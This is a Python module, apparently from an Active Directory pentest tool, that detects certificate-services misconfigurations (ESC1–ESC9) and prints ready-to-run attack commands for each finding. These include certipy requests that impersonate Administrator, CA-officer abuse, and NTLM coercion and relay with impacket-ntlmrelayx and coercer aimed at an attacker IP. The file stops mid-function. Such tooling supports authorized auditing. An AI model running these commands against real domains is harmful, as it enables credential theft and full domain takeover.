"""
ADCS module — Active Directory Certificate Services enumeration.
Detects ESC1-ESC4, ESC6-ESC9 misconfigurations.

ESC1  — Enrollee supplies Subject (SAN) + Client Auth EKU
ESC2  — Any Purpose EKU (or no EKU) — can act as any cert
ESC3  — Certificate Request Agent EKU — can enroll on behalf of others
ESC4  — Template has dangerous ACL (GenericWrite / WriteDACL / WriteOwner)
ESC6  — CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set (CA-level SAN)
ESC7  — Non-privileged ManageCA / ManageCertificates on the CA.
        Primary source is the CA host registry Security descriptor read over
        RRP (authoritative, like certipy); falls back to the CA LDAP object
        DACL as a weaker proxy when RRP is unavailable.
ESC8  — Web enrollment (/certsrv/) reachable with NTLM — actively probed over
        HTTP/HTTPS, plus AD-declared msPKI-Enrollment-Servers as a hint.
ESC9  — Template sets NoSecurityExtension (szOID SID binding omitted) on an
        authentication template → weak-mapping impersonation.

Not covered: ESC5, ESC10-ESC16.
"""

import struct
from modules.base import BaseModule, ScanContext
from core.output import Severity, C, highlight_command
from utils.ldap_helpers import get_attr, get_int, get_list, get_raw
from utils.sids import resolve_sid, bytes_to_sid, is_privileged_sid

# EKU OIDs
EKU_CLIENT_AUTH      = "1.3.6.1.5.5.7.3.2"
EKU_ANY_PURPOSE      = "2.5.29.37.0"
EKU_CERT_REQ_AGENT   = "1.3.6.1.4.1.311.20.2.1"
EKU_SMART_CARD_LOGON = "1.3.6.1.4.1.311.20.2.2"
EKU_PKINIT_KDC       = "1.3.6.1.5.2.3.5"

# CT_FLAG values (msPKI-Certificate-Name-Flag)
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT            = 0x00000001
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME   = 0x00010000
CT_FLAG_SUBJECT_ALT_REQUIRE_UPN              = 0x02000000
CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL            = 0x04000000
CT_FLAG_SUBJECT_REQUIRE_EMAIL                = 0x00020000
CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN            = 0x00008000

# msPKI-Enrollment-Flag
PEND_ALL_REQUESTS                = 0x00000002
CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS = 0x00000001
CT_FLAG_NO_SECURITY_EXTENSION    = 0x00080000  # ESC9: omits szOID_NTDS_CA_SECURITY_EXT

# msPKI-RA-Signature (number of authorized signatures required)

# Template schema version
TEMPLATE_SCHEMA_V1 = 1

# Dangerous ACL rights (same masks as acls.py)
GENERIC_ALL  = 0x10000000
GENERIC_WRITE = 0x40000000
WRITE_DACL   = 0x00040000
WRITE_OWNER  = 0x00080000

# Low-priv SIDs to skip
_SKIP_SIDS = {
    "S-1-5-18", "S-1-5-9", "S-1-5-10", "S-1-3-0",
}

# Broad low-privilege principals: any authenticated attacker effectively
# belongs to one of these. Enrollment granted to one of them is what makes
# an ESC1/ESC2/ESC3 template actually exploitable (matches certipy -vulnerable).
#   S-1-1-0     Everyone
#   S-1-5-11    Authenticated Users
#   S-1-5-32-545 BUILTIN\Users
_LOW_PRIV_WELL_KNOWN = {"S-1-1-0", "S-1-5-11", "S-1-5-32-545"}
#   513 Domain Users, 515 Domain Computers, 514 Domain Guests
_LOW_PRIV_RIDS = {"513", "514", "515"}


def _is_low_priv_sid(sid: str, domain_sid: str) -> bool:
    """True if the SID is a broad principal any low-priv user belongs to."""
    if sid in _LOW_PRIV_WELL_KNOWN:
        return True
    if domain_sid and sid.startswith(domain_sid + "-"):
        return sid[len(domain_sid) + 1:] in _LOW_PRIV_RIDS
    return False


# ESC4/ESC7 only matter when a NON-privileged principal holds the dangerous
# right (already-privileged principals legitimately control the CA/template).
# The canonical is_privileged_sid() lives in utils.sids (shared with acls.py).

_TEMPLATE_ATTRS = [
    "name", "displayName",
    "msPKI-Certificate-Name-Flag",
    "msPKI-Enrollment-Flag",
    "msPKI-RA-Signature",
    "msPKI-Private-Key-Flag",
    "pKIExtendedKeyUsage",
    "nTSecurityDescriptor",
    "objectClass",
    "pkiOverlapPeriod",
    "pkiExpirationPeriod",
    "msPKI-Template-Schema-Version",
    "msPKI-Certificate-Application-Policy",
]

_CA_ATTRS = [
    "name", "dNSHostName", "cACertificate",
    "certificateTemplates",
    "msPKI-Enrollment-Servers",      # web enrollment URLs
    "flags",
    "nTSecurityDescriptor",
]


# -----------------------------------------------------------------------
# Reuse DACL parser from acls module
# -----------------------------------------------------------------------

def _get_dacl_parser():
    from modules.acls import _parse_dacl, _parse_sid_from_ace
    return _parse_dacl


# -----------------------------------------------------------------------
# Helpers
# -----------------------------------------------------------------------

def _eku_allows_auth(ekus: list) -> bool:
    return (
        EKU_CLIENT_AUTH in ekus
        or EKU_SMART_CARD_LOGON in ekus
        or EKU_PKINIT_KDC in ekus
        or EKU_ANY_PURPOSE in ekus
        or len(ekus) == 0  # No EKU = any purpose
    )


def _has_pending_approval(enroll_flags: int) -> bool:
    return bool(enroll_flags & PEND_ALL_REQUESTS)


def _requires_manager_approval(enroll_flags: int) -> bool:
    return bool(enroll_flags & PEND_ALL_REQUESTS)


def _probe_web_enrollment(host: str, timeout: float = 4.0) -> list:
    """Probe /certsrv/ over HTTP then HTTPS.

    Returns a list of (scheme, url, ntlm_bool). A Windows web-enrollment
    endpoint answers 401 with a 'WWW-Authenticate: NTLM/Negotiate' header,
    which is exactly the NTLM-relay surface ESC8 targets.
    """
    import urllib.request
    import urllib.error
    import ssl

    results = []
    for scheme in ("http", "https"):
        url = f"{scheme}://{host}/certsrv/"
        kwargs = {"timeout": timeout}
        if scheme == "https":
            kwargs["context"] = ssl._create_unverified_context()
        try:
            req = urllib.request.Request(url, method="GET")
            resp = urllib.request.urlopen(req, **kwargs)
            results.append((scheme, url, False))  # reachable, anonymous
            resp.close()
        except urllib.error.HTTPError as e:
            auth = ",".join(e.headers.get_all("WWW-Authenticate") or [])
            ntlm = "ntlm" in auth.lower() or "negotiate" in auth.lower()
            if e.code in (401, 403) or ntlm:
                results.append((scheme, url, ntlm))
        except Exception:
            pass  # unreachable / timeout / TLS error → not a finding
    return results


def _certipy_req_block(user, pw, domain, dc, ca, ca_host, cn, target_upn) -> str:
    """Two ready-to-run variants for a SAN-based certipy request.

    The direct form uses RPC/DCOM (TCP 135 + dynamic ports) which is frequently
    filtered ("No route to host" on the endpoint mapper). The Kerberos form
    acquires a TGT and talks to the CA by FQDN, which routinely succeeds where
    the direct RPC path fails.
    """
    up     = f"{user}@{domain}" if domain else user
    suffix = f"-ca '{ca}' -template '{cn}' -upn '{target_upn}'"
    auth_d = f"-u '{up}' -p '{pw}'" if pw else f"-u '{up}' -k -no-pass"
    lines = [
        "# Direct (RPC/DCOM — needs TCP 135 + dynamic RPC ports open to the CA):",
        f"certipy-ad req {auth_d} -dc-ip {dc} {suffix}",
        f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc}",
        "# If RPC is filtered ('No route to host' / endpoint mapper) — use Kerberos:",
    ]
    if pw:
        lines.append(f"impacket-getTGT {domain}/{user}:'{pw}' -dc-ip {dc}")
        lines.append(f"export KRB5CCNAME={user}.ccache")
    lines.append(
        f"certipy-ad req -u '{up}' -k -no-pass -target '{ca_host}' "
        f"-dc-ip {dc} -ns {dc} -dns-tcp {suffix}"
    )
    lines.append(f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc}")
    return "\n".join(lines)


def _get_template_acl_issues(raw_sd: bytes, domain_sid: str) -> list:
    """Return list of (principal, reason) for dangerous template ACEs."""
    parse_dacl = _get_dacl_parser()
    aces = parse_dacl(raw_sd)
    issues = []
    for ace in aces:
        sid = ace["sid"]
        if sid in _SKIP_SIDS:
            continue
        # Skip already-privileged principals: their control over the template
        # is expected (e.g. Administrator/Domain Admins own it), not ESC4.
        if is_privileged_sid(sid, domain_sid):
            continue
        mask = ace["mask"]
        if mask & GENERIC_ALL:
            issues.append((resolve_sid(sid, domain_sid), sid, "GenericAll"))
        elif mask & WRITE_DACL:
            issues.append((resolve_sid(sid, domain_sid), sid, "WriteDACL"))
        elif mask & WRITE_OWNER:
            issues.append((resolve_sid(sid, domain_sid), sid, "WriteOwner"))
        elif mask & GENERIC_WRITE:
            issues.append((resolve_sid(sid, domain_sid), sid, "GenericWrite"))
    return issues


def _get_enrollment_principals(raw_sd: bytes, domain_sid: str) -> list:
    """Return (name, sid) tuples for principals with enrollment rights.

    An ACE grants enrollment when it carries the Certificate-Enrollment or
    AutoEnrollment extended-right GUID, or GenericAll (0x10000000) which
    subsumes it. Note: a bare extended-right ACE has an all-zero object GUID,
    so matching on the enrollment GUIDs (not on mask & 0x100) is what keeps
    GenericAll-style grants and specific enrollment grants both covered.
    """
    GUID_ENROLL  = "0e10c968-78fb-11d2-90d4-00c04f79dc55"
    GUID_AUTOENROLL = "a05b8cc2-17bc-4802-a710-e7c15ab866a2"
    parse_dacl = _get_dacl_parser()
    aces = parse_dacl(raw_sd)
    principals = []
    seen = set()
    for ace in aces:
        sid  = ace["sid"]
        guid = ace["object_type_guid"].lower()
        mask = ace["mask"]
        grants_enroll = (
            guid in (GUID_ENROLL, GUID_AUTOENROLL)
            or (mask & GENERIC_ALL)
            or (mask & 0x00000100)  # control-access right, generic ACE
        )
        if grants_enroll and sid not in seen:
            seen.add(sid)
            principals.append((resolve_sid(sid, domain_sid), sid))
    return principals


def _template_enrollees(entry, domain_sid: str, actionable_sids=frozenset()):
    """Return (all_enrollee_names, actionable_enrollee_names) for a template.

    An enrollee is "actionable" when the current identity can enroll as it:
    either a broad low-priv group any user belongs to (Domain Users,
    Authenticated Users, …) OR a SID the authenticated user holds directly or
    via group membership (actionable_sids, from ctx.current_user_sids). This
    makes the ESC verdict user-relative, like certipy -vulnerable.
    """
    raw_sd = get_raw(entry, "nTSecurityDescriptor")
    if not raw_sd:
        return [], []
    pairs = _get_enrollment_principals(raw_sd, domain_sid)
    names = [n for (n, _s) in pairs]
    actionable = [
        n for (n, sid) in pairs
        if _is_low_priv_sid(sid, domain_sid) or sid in actionable_sids
    ]
    return names, actionable


# -----------------------------------------------------------------------
# Module
# -----------------------------------------------------------------------

class ADCSModule(BaseModule):
    name        = "adcs"
    description = "ADCS PKI enumeration and ESC1-ESC8 misconfiguration detection"

    def run(self, ctx: ScanContext) -> None:
        out = ctx.out
        out.section("ADCS — CERTIFICATE SERVICES")

        config_dn = ctx.conn.dc_info.config_dn
        if not config_dn:
            out.warning("Config partition not available — cannot enumerate ADCS")
            return

        # Find Certificate Authorities
        ca_entries = ctx.conn.search(
            "(objectClass=pKIEnrollmentService)",
            _CA_ATTRS,
            base=f"CN=Enrollment Services,CN=Public Key Services,CN=Services,{config_dn}",
        )

        if not ca_entries:
            out.info("No Certificate Authorities found (ADCS may not be deployed)")
            return

        out.success(f"{len(ca_entries)} Certificate Authority(ies) found")

        # Find templates
        template_entries = ctx.conn.search(
            "(objectClass=pKICertificateTemplate)",
            _TEMPLATE_ATTRS,
            base=f"CN=Certificate Templates,CN=Public Key Services,CN=Services,{config_dn}",
        )

        out.counter("Certificate Templates", len(template_entries))

        # Collect template names published by CAs
        published_templates = set()
        for ca in ca_entries:
            for t in get_list(ca, "certificateTemplates"):
                published_templates.add(t.lower())

        for ca in ca_entries:
            self._show_ca(ctx, ca, config_dn)

        # Analyze templates
        # For ESC1/2/3, the `_exploitable` list holds templates a low-priv user
        # can actually enroll in; `_info` holds same-config templates where only
        # privileged principals can enroll (misconfig, not actionable).
        esc1, esc1_info = [], []
        esc2, esc2_info = [], []
        esc3, esc3_info = [], []
        esc4 = []
        esc9, esc9_info = [], []

        # Identity-relative exploitability: SIDs the authenticated user holds.
        cur_sids = ctx.current_user_sids

        for entry in template_entries:
            tname       = get_attr(entry, "name")
            display     = get_attr(entry, "displayName") or tname
            name_flags  = get_int(entry, "msPKI-Certificate-Name-Flag")
            enroll_flags = get_int(entry, "msPKI-Enrollment-Flag")
            ra_sig      = get_int(entry, "msPKI-RA-Signature")
            ekus        = get_list(entry, "pKIExtendedKeyUsage")
            app_policies = get_list(entry, "msPKI-Certificate-Application-Policy")
            all_ekus    = ekus + app_policies

            # Only consider templates published by at least one CA
            is_published = tname.lower() in published_templates

            # Manager approval bypass
            no_approval = not _requires_manager_approval(enroll_flags)

            # ESC1: enrollee supplies SAN + Client Auth EKU + no approval
            #        + no authorized signatures (RA-Signature) required.
            # Only exploitable if a low-priv principal actually has enrollment
            # rights — otherwise it is a misconfig but not actionable (this is
            # what certipy -vulnerable filters on).
            if (
                is_published
                and no_approval
                and ra_sig == 0
                and (name_flags & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
                and _eku_allows_auth(all_ekus)
            ):
                enrollees, low_priv = _template_enrollees(entry, ctx.domain_sid, cur_sids)
                record = {
                    "name":      display,
                    "cn":        tname,
                    "ekus":      ", ".join(all_ekus[:2]),
                    "enrollees": enrollees,
                    "low_priv":  low_priv,
                }
                (esc1 if low_priv else esc1_info).append(record)

            # ESC2: Any Purpose EKU or no EKU
            if (
                is_published
                and no_approval
                and ra_sig == 0
                and (EKU_ANY_PURPOSE in all_ekus or len(all_ekus) == 0)
                and not (name_flags & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
            ):
                enrollees, low_priv = _template_enrollees(entry, ctx.domain_sid, cur_sids)
                record = {
                    "name":      display,
                    "cn":        tname,
                    "enrollees": enrollees,
                    "low_priv":  low_priv,
                }
                (esc2 if low_priv else esc2_info).append(record)

            # ESC3: Certificate Request Agent EKU
            if (
                is_published
                and no_approval
                and ra_sig == 0
                and EKU_CERT_REQ_AGENT in all_ekus
            ):
                enrollees, low_priv = _template_enrollees(entry, ctx.domain_sid, cur_sids)
                record = {
                    "name":      display,
                    "cn":        tname,
                    "enrollees": enrollees,
                    "low_priv":  low_priv,
                }
                (esc3 if low_priv else esc3_info).append(record)

            # ESC4: Dangerous template ACL
            raw_sd = get_raw(entry, "nTSecurityDescriptor")
            if raw_sd:
                acl_issues = _get_template_acl_issues(raw_sd, ctx.domain_sid)
                if acl_issues:
                    esc4.append({"name": display, "issues": acl_issues})

            # ESC9: NoSecurityExtension flag — issued certs omit the SID-binding
            # security extension, enabling weak-mapping abuse on an auth template.
            if (
                is_published
                and (enroll_flags & CT_FLAG_NO_SECURITY_EXTENSION)
                and _eku_allows_auth(all_ekus)
            ):
                enrollees, low_priv = _template_enrollees(entry, ctx.domain_sid, cur_sids)
                record = {
                    "name":      display,
                    "cn":        tname,
                    "ekus":      ", ".join(all_ekus[:2]),
                    "enrollees": enrollees,
                    "low_priv":  low_priv,
                }
                (esc9 if low_priv else esc9_info).append(record)

        # ---- Attach copy-pasteable commands (from enumeration data) ----
        ca_name = get_attr(ca_entries[0], "name") if ca_entries else "<CA>"
        ca_host = get_attr(ca_entries[0], "dNSHostName") if ca_entries else ""
        for esc_id, items in (("ESC1", esc1), ("ESC2", esc2),
                              ("ESC3", esc3), ("ESC9", esc9)):
            for rec in items:
                self._attach_cmd(ctx, esc_id, rec, ca_name, ca_host)

        # ---- Output findings ----
        self._report_esc(ctx, "ESC1", esc1,
            "Enrollee Supplies Subject + Client Auth EKU",
            "Allows requesting a certificate with an arbitrary SAN (e.g., Domain Admin UPN).",
            Severity.CRITICAL)
        self._report_esc_info(ctx, "ESC1", esc1_info)

        self._report_esc(ctx, "ESC2", esc2,
            "Any Purpose / No EKU",
            "Certificate can be used for any purpose including authentication.",
            Severity.HIGH)
        self._report_esc_info(ctx, "ESC2", esc2_info)

        self._report_esc(ctx, "ESC3", esc3,
            "Certificate Request Agent",
            "Allows enrolling on behalf of other users → impersonate any user.",
            Severity.HIGH)
        self._report_esc_info(ctx, "ESC3", esc3_info)

        self._report_esc(ctx, "ESC9", esc9,
            "No Security Extension (szOID SID binding omitted)",
            "Issued certificates omit the SID security extension. Combined with a "
            "weak certificate mapping on the DC (ESC10/altSecurityIdentities), a "
            "low-priv user can enroll and impersonate another account.\n"
            "Pair with: certipy req … then account-mapping abuse.",
            Severity.HIGH)
        self._report_esc_info(ctx, "ESC9", esc9_info)

        if esc4:
            out.subsection("ESC4 — Dangerous Template ACL")
            for t in esc4:
                print(f"\n    {C.YELLOW}{t['name']}{C.RESET}")
                rows = [[name, sid, reason] for name, sid, reason in t["issues"]]
                out.table(["Principal", "SID", "Permission"], rows,
                          highlight_fn=lambda r: C.RED, indent=8)
            ctx.quick_wins.add(
                Severity.HIGH,
                f"ESC4 — Dangerous ACL on {len(esc4)} template(s)",
                "A low-priv user can modify the template to introduce ESC1/ESC2.\n"
                + "\n".join(t["name"] for t in esc4),
            )

        if not (esc1 or esc1_info or esc2 or esc2_info or esc3 or esc3_info
                or esc4 or esc9 or esc9_info):
            out.success("No template ESC misconfigurations detected on published templates")

    def _show_ca(self, ctx: ScanContext, ca_entry, config_dn: str) -> None:
        out  = ctx.out
        name = get_attr(ca_entry, "name")
        dns  = get_attr(ca_entry, "dNSHostName")

        out.subsection(f"CA: {name}")
        out.kv("Hostname", dns)

        templates = get_list(ca_entry, "certificateTemplates")
        out.kv("Published templates", str(len(templates)))

        # ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 (CA flag bit 0x00040000)
        flags = get_int(ca_entry, "flags")
        if flags & 0x00040000:
            a      = ctx.args
            user   = (getattr(a, "username", "") or "").split("@")[0]
            pw     = getattr(a, "password", "") or ""
            domain = ctx.domain or (getattr(a, "domain", "") or "")
            dc     = getattr(a, "dc", "") or ""
            upn    = f"Administrator@{domain}" if domain else "Administrator"
            out.critical("ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 is set on this CA!")
            ctx.quick_wins.add(
                Severity.CRITICAL,
                f"ESC6 on CA {name}",
                "CA accepts user-specified SAN in all certificate requests → any "
                "Client-Auth template becomes ESC1.\n"
                + _certipy_req_block(user, pw, domain, dc, name,
                                     dns or "<ca-host-fqdn>", "User", upn),
            )

        self._check_esc7(ctx, name, dns, ca_entry)
        self._check_esc8(ctx, name, dns, ca_entry)

    # ------------------------------------------------------------------
    # ESC7 — ManageCA / ManageCertificates on the CA
    # ------------------------------------------------------------------
    def _check_esc7(self, ctx: ScanContext, name: str, dns: str, ca_entry) -> None:
        """Detect non-privileged ManageCA/ManageCertificates on the CA.

        Preferred source is the CA host registry Security descriptor read over
        RRP (authoritative, like certipy). If RRP is unavailable we fall back to
        the CA's LDAP object DACL as a weaker proxy (object-takeover rights).
        """
        out = ctx.out
        a = ctx.args
        host_machine_acct = (dns.split(".")[0].upper() + "$") if dns else ""

        from utils.ca_rrp import (
            read_ca_security, CA_RIGHT_MANAGE_CA, CA_RIGHT_MANAGE_CERTIFICATES,
        )
        raw_sd, reason = read_ca_security(
            host=dns, dc_ip=getattr(a, "dc", "") or "",
            ca_name=name,
            username=getattr(a, "username", "") or "",
            password=getattr(a, "password", "") or "",
            domain=ctx.domain or (getattr(a, "domain", "") or ""),
            ccache=getattr(a, "ccache", "") or "",
        )

        from modules.acls import _parse_dacl

        if raw_sd is not None:
            aces = _parse_dacl(raw_sd)
            issues = []
            for ace in aces:
                sid = ace["sid"]
                if sid in _SKIP_SIDS or is_privileged_sid(sid, ctx.domain_sid):
                    continue
                mask = ace["mask"]
                rights = []
                if mask & CA_RIGHT_MANAGE_CA:
                    rights.append("ManageCA")
                if mask & CA_RIGHT_MANAGE_CERTIFICATES:
                    rights.append("ManageCertificates")
                if not rights:
                    continue
                pname = resolve_sid(sid, ctx.domain_sid)
                if host_machine_acct and pname.split("\\")[-1].upper() == host_machine_acct:
                    continue
                issues.append((pname, sid, " + ".join(rights)))
            if issues:
                out.critical(f"ESC7: Non-privileged CA rights on {name} (via RRP)")
                out.table(["Principal", "SID", "CA Right"],
                          [[n, s, r] for n, s, r in issues],
                          highlight_fn=lambda r: C.RED, indent=8)
                auth = self._cp_auth(ctx)
                user = (getattr(ctx.args, "username", "") or "").split("@")[0]
                dc   = getattr(ctx.args, "dc", "") or ""
                ctx.quick_wins.add(
                    Severity.CRITICAL,
                    f"ESC7 on CA {name} — ManageCA/ManageCertificates",
                    "Non-privileged principal(s) hold CA management rights:\n"
                    + "\n".join(f"  {n} — {r}" for n, _s, r in issues) + "\n"
                    "Abuse (ManageCA → enable SAN flag, then ESC1 on any client-auth tpl):\n"
                    f"  certipy-ad ca {auth} -ca '{name}' -add-officer '{user}'\n"
                    f"  certipy-ad ca {auth} -ca '{name}' -enable-template SubCA\n"
                    f"  certipy-ad req {auth} -ca '{name}' -template SubCA -upn 'Administrator@{ctx.domain}'  # then -issue/-retrieve as officer",
                )
            else:
                out.success(f"ESC7: no non-privileged CA management rights on {name} (via RRP)")
            return

        # ---- Fallback: LDAP object DACL (weaker proxy) ----
        if ctx.args.verbose:
            out.debug(f"ESC7: RRP unavailable ({reason}); using LDAP object DACL proxy")
        raw = get_raw(ca_entry, "nTSecurityDescriptor")
        if not raw:
            return
        aces = _parse_dacl(raw)
        ca_issues = []
        for ace in aces:
            sid = ace["sid"]
            if sid in _SKIP_SIDS or is_privileged_sid(sid, ctx.domain_sid):
                continue
            mask = ace["mask"]
            reason2 = ""
            if mask & GENERIC_ALL:
                reason2 = "GenericAll"
            elif mask & WRITE_DACL:
                reason2 = "WriteDACL"
            elif mask & WRITE_OWNER:
                reason2 = "WriteOwner"
            elif mask & GENERIC_WRITE:
                reason2 = "GenericWrite"
            if not reason2:
                continue
            pname = resolve_sid(sid, ctx.domain_sid)
            if host_machine_acct and pname.split("\\")[-1].upper() == host_machine_acct:
                continue
            ca_issues.append((pname, sid, reason2))
        if ca_issues:
            out.warning(f"ESC7 (proxy): non-privileged control over CA object {name}")
            out.table(["Principal", "SID", "Right"],
                      [[n, s, r] for n, s, r in ca_issues],
                      highlight_fn=lambda r: C.YELLOW, indent=8)
            auth = self._cp_auth(ctx)
            ctx.quick_wins.add(
                Severity.HIGH,
                f"ESC7 on CA {name} — non-privileged CA object control (LDAP proxy)",
                "RRP unavailable; detected via LDAP object DACL. A non-privileged "
                "principal can take over the CA's LDAP object.\n"
                "Principals: " + ", ".join(n for n, _s, _r in ca_issues) + "\n"
                f"Confirm over RRP: certipy-ad find {auth} -stdout -text",
            )

    # ------------------------------------------------------------------
    # ESC8 — web enrollment (NTLM relay target)
    # ------------------------------------------------------------------
    def _check_esc8(self, ctx: ScanContext, name: str, dns: str, ca_entry) -> None:
        """Detect web enrollment endpoints — actively probed, plus LDAP hint."""
        out = ctx.out

        # LDAP hint: enrollment-server URLs published in AD.
        enroll_servers = get_list(ca_entry, "msPKI-Enrollment-Servers")
        http_decl = [s for s in enroll_servers if "http" in s.lower()]

        # Active probe of /certsrv/ on the CA host (HTTP first = best relay).
        probed = _probe_web_enrollment(dns) if dns else []

        if not probed and not http_decl:
            return

        for scheme, url, ntlm in probed:
            if scheme == "http" and ntlm:
                out.critical(f"ESC8: HTTP web enrollment + NTLM on {name}")
                sev, note = Severity.CRITICAL, "HTTP + NTLM: prime NTLM-relay target (no TLS)."
            elif scheme == "https" and ntlm:
                out.warning(f"ESC8: HTTPS web enrollment + NTLM on {name}")
                sev, note = Severity.HIGH, "HTTPS + NTLM: relayable if EPA/channel-binding is off."
            else:
                out.info(f"ESC8: web enrollment reachable ({scheme}) on {name}")
                sev, note = Severity.MEDIUM, f"{scheme} enrollment reachable; NTLM not confirmed."
            out.kv("  Endpoint", url)
            relay_target = url.rstrip("/") + "/certfnsh.asp"
            relay_base = url.split("/certsrv")[0]   # scheme://host for certipy
            # coercer secret: password, else pass-the-hash (--hashes :NT), else placeholder
            _pw = getattr(ctx.args, "password", "") or ""
            _nt = getattr(ctx.args, "nthash", "") or ""
            csec = f"-p '{_pw}'" if _pw else (f"--hashes :{_nt}" if _nt else "-p '<pass>'")
            ctx.quick_wins.add(
                sev,
                f"ESC8 on CA {name} — web enrollment ({scheme})",
                note + "\nCoerce a DC/machine to authenticate, then relay to ADCS:\n"
                "  # relay (impacket). NOTE: may crash at 'Generating CSR...' on "
                "recent pyOpenSSL\n"
                "  #   (>=24 removed crypto.X509Req) — use the certipy variant below if so:\n"
                f"  impacket-ntlmrelayx -t {relay_target} -smb2support --adcs --template DomainController\n"
                "  # relay (certipy) — modern crypto, resilient to the pyOpenSSL breakage:\n"
                f"  certipy-ad relay -target '{relay_base}' -template DomainController -forever\n"
                "  # coercer -t = the host you coerce (the DC), NOT the CA name; "
                "use the DC IP to avoid DNS issues:\n"
                f"  coercer coerce -l <attacker-ip> -t {getattr(ctx.args,'dc','') or '<dc-ip>'} "
                f"-u '{(getattr(ctx.args,'username','') or '').split('@')[0]}' "
                f"{csec} -d {ctx.domain} --always-continue\n"
                "  # then: certipy-ad auth -pfx dc.pfx -dc-ip " + (getattr(ctx.args, "dc", "") or ""),
            )

        # Report AD-declared endpoints that we could not actively confirm.
        if http_decl and not probed:
            out.warning(f"ESC8: enrollment server URL(s) declared in AD for {name}")
            for url in http_decl:
                out.kv("  Declared URL", url)
            ctx.quick_wins.add(
                Severity.HIGH,
                f"ESC8 on CA {name} — declared web enrollment",
                "Web enrollment server published in AD (not actively reachable from here):\n"
                + "\n".join("  " + u for u in http_decl),
            )

    # ------------------------------------------------------------------
    # Ready-to-run command builders (filled from enumeration data)
    # ------------------------------------------------------------------
    @staticmethod
    def _cp_auth(ctx) -> str:
        """certipy/impacket auth flags for the CURRENT session, copy-pasteable."""
        a = ctx.args
        user = (getattr(a, "username", "") or "").split("@")[0]
        domain = ctx.domain or (getattr(a, "domain", "") or "")
        upn = f"{user}@{domain}" if domain else user
        parts = [f"-u '{upn}'"]
        if getattr(a, "password", ""):
            parts.append(f"-p '{a.password}'")
        elif getattr(a, "ccache", "") or True:
            # Kerberos ccache (explicit --ccache or $KRB5CCNAME)
            parts.append("-k -no-pass")
        parts.append(f"-dc-ip {getattr(a, 'dc', '') or ''}")
        return " ".join(parts)

    @staticmethod
    def _netbios(ctx) -> str:
        domain = ctx.domain or (getattr(ctx.args, "domain", "") or "")
        return domain.split(".")[0].upper() if domain else "DOMAIN"

    def _attach_cmd(self, ctx, esc_id: str, rec: dict, ca_name: str,
                    ca_host: str = "") -> None:
        """Store a complete, copy-pasteable exploitation command on the record.

        Commands include both a direct (RPC) and a Kerberos variant, because the
        direct certipy request goes over RPC/DCOM which is often filtered.
        """
        a      = ctx.args
        user   = (getattr(a, "username", "") or "").split("@")[0]
        pw     = getattr(a, "password", "") or ""
        domain = ctx.domain or (getattr(a, "domain", "") or "")
        dc     = getattr(a, "dc", "") or ""
        ca_host = ca_host or f"<{ca_name}-host-fqdn>"
        cn     = rec.get("cn", rec["name"])
        upn    = f"Administrator@{domain}" if domain else "Administrator"
        nb     = self._netbios(ctx)
        auth   = self._cp_auth(ctx)

        if esc_id in ("ESC1", "ESC9"):
            rec["cmd"] = _certipy_req_block(user, pw, domain, dc, ca_name,
                                            ca_host, cn, upn)
        elif esc_id == "ESC2":
            kinit = (f"impacket-getTGT {domain}/{user}:'{pw}' -dc-ip {dc} && "
                     f"export KRB5CCNAME={user}.ccache") if pw else \
                    "# KRB5CCNAME already set"
            rec["cmd"] = (
                f"certipy-ad req {auth} -ca '{ca_name}' -template '{cn}'\n"
                f"# Any-Purpose/SubCA cert — usable for client auth; then "
                f"certipy-ad auth -pfx <out>.pfx -dc-ip {dc}\n"
                f"# If RPC is filtered — Kerberos: {kinit}\n"
                f"certipy-ad req -u '{user}@{domain}' -k -no-pass -target '{ca_host}' "
                f"-dc-ip {dc} -ns {dc} -dns-tcp -ca '{ca_name}' -template '{cn}'"
            )
        elif esc_id == "ESC3":
            kinit = (f"impacket-getTGT {domain}/{user}:'{pw}' -dc-ip {dc} && "
                     f"export KRB5CCNAME={user}.ccache") if pw else \
                    "# KRB5CCNAME already set"
            rec["cmd"] = (
                f"certipy-ad req {auth} -ca '{ca_name}' -template '{cn}'   # enrollment-agent cert\n"
                f"certipy-ad req {auth} -ca '{ca_name}' -template User "
                f"-pfx <agent>.pfx -on-behalf-of '{nb}\\Administrator'\n"
                f"certipy-ad auth -pfx administrator.pfx -dc-ip {dc}\n"
                f"# If RPC is filtered — Kerberos (add: {kinit} ; then "
                f"-k -no-pass -target '{ca_host}' -ns {dc} -dns-tcp to each req)"
            )

    @staticmethod
    def _report_esc(ctx, esc_id: str, items: list, title: str, detail: str,
                    severity: Severity) -> None:
        if not items:
            return
        out = ctx.out
        out.subsection(f"{esc_id} — {title}")
        for item in items:
            print(f"    {C.YELLOW}{C.BOLD}{item['name']}{C.RESET}")
            if item.get("ekus"):
                out.kv("    EKUs", item["ekus"], indent=6)
            if item.get("low_priv"):
                out.kv("    Enrollable by", ", ".join(item["low_priv"]), indent=6)
            elif item.get("enrollees"):
                out.kv("    Enrollees", ", ".join(item["enrollees"]), indent=6)
            if item.get("cmd"):
                out.kv("    Exploit", "", indent=6)
                for cmd_line in item["cmd"].split("\n"):
                    print(f"        {highlight_command(cmd_line)}")

        # Synthesis: per template, the actionable principal + the ready command.
        lines = []
        for t in items:
            who = ", ".join(t.get("low_priv") or t.get("enrollees") or ["?"])
            lines.append(f"  - {t['name']}  (enrollable by: {who})")
            if t.get("cmd"):
                for cmd_line in t["cmd"].split("\n"):
                    lines.append(f"      {cmd_line}")
        ctx.quick_wins.add(
            severity,
            f"{esc_id} — {len(items)} vulnerable template(s)",
            detail + "\nEnrollable by a principal the current identity controls:\n"
            + "\n".join(lines),
        )

    @staticmethod
    def _report_esc_info(ctx, esc_id: str, items: list) -> None:
        """Report templates matching an ESC config but not low-priv enrollable.

        A real misconfiguration, but not actionable by an unprivileged user
        (certipy -vulnerable will not list these). Shown as info, no Quick Win.
        """
        if not items:
            return
        out = ctx.out
        out.subsection(f"{esc_id} (config) — not enrollable by current identity")
        for t in items:
            print(f"    {C.DIM}{t['name']}{C.RESET}")
            if t.get("enrollees"):
